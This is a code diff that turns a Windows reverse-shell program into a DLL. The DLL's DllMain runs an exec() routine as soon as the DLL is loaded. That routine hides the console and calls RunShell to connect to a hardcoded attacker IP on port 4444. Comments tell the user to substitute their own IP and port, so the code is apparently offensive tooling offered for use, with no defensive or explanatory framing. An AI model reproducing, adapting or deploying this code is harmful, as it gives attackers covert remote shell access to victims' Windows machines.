@@ -60,16 +60,32 @@ void RunShell(char* C2Server, int C2Port) {
     }
 }
 
-int main(int argc, char **argv) {
-    //FreeConsole(); no close window
-    if (argc == 3) {
-        int port  = atoi(argv[2]);
-        RunShell(argv[1], port);
+void exec(void) {
+    FreeConsole(); //no close window
+    char host[] = "192.168.96.134";  // change this to your ip address
+    int port = 4444;                //change this to your open port
+    RunShell(host, port);
+}
+
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,
+    DWORD fdwReason,
+    LPVOID lpReserved)
+{
+    switch( fdwReason )
+    {
+        case DLL_PROCESS_ATTACH:
+           exec();
+           break;
+
+        case DLL_THREAD_ATTACH:
+            break;
+
+        case DLL_THREAD_DETACH:
+            break;
+
+        case DLL_PROCESS_DETACH:
+            break;
     }
-    else {
-        char host[] = "192.168.15.130";  // change this to your ip address
-        int port = 4444;                //chnage this to your open port
-        RunShell(host, port);
-    }
-    return 0;
+    return TRUE;
 }
